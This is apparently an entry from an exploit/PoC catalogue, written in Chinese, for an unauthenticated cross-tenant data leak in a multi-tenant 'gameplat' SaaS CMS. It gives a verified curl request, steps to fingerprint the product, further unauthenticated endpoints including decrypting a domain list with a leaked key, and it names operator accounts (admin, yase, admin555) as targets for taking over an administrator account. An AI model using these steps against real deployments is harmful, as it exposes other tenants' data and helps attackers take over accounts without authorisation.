# CN7/gameplat 多租户SaaS：未授权 /api/tenant/setting/getPersonalCenter 跨租户泄露（含跨租户运营账号）

- **code**: cn7-gameplat-多租户saas-未授权-api-tenant-setting-getpersonalcent
- **kind**: poc
- **category**: info-leak
- **component**: CN7 / gameplat CMS (Spring Boot, 5.3.0-RELEASE)
- **severity**: medium
- **source**: self
- **verified**: 1
- **verified_note**: 实测 2026-10-10：curl -sk https://203.0.113.16:10666/api/tenant/setting/getPersonalCenter 无需凭据返回 code:0，data 内同时含 tenant=oottt(4行,updateBy=yase/admin) 与 tenant=kc375(1行)；加 ?tenant=oottt/kc375 参数被忽略，未按租户 scope。同站 /api/helpCenter/list 未授权回显 createBy=admin555。
- **tags**: 多租户,cross-tenant,unauth,info-leak,CN7,gameplat,SaaS
- **created_at**: 2026-10-09T19:35:46.220Z

## 用法

```
1) 判定该产品为多租户 SaaS：GET /api/version 看 license 字段(=租户号)，GET /configPage.js 看 window.CONFIG.tenant。
2) 跨租户读：curl -sk "https://<host>:<port>/api/tenant/setting/getPersonalCenter" —— 未授权即返回多个 tenant 的 personal_center 行（settingValue/settingDesc/updateBy）。tenant 查询参数被忽略（不可指定）。
3) 附带未授权信息面：/api/helpCenter/list(createBy)、/api/tenant/domain/list(AES-OFB 加密,用泄露密钥解)、/api/config/system、/api/tenant/setting/getConfig(POST,24键公开配置)。
4) 注意：/api/tenant/setting/{save,update,add,edit} 等写接口在本实例 404，无跨租户写。
5) 运营方目标账号：跨租户 updateBy 出现的 admin / yase / admin555 即平台级操作员，是「拿管理员账户」的靶子。
```
